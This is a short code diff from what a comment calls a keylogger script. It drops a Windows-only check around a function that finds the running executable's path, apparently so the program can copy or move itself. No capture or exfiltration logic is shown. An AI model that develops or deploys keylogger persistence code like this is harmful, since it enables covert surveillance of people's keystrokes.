@@ -5,8 +5,6 @@ import shutil  # automate task, like copying and moving
 
 def path_manipulation():
 
- if os.name == 'nt':
-
    try:
          # provide the path of the process(keylogger script) that is currently running 
          exe_file = Path(sys.executable)
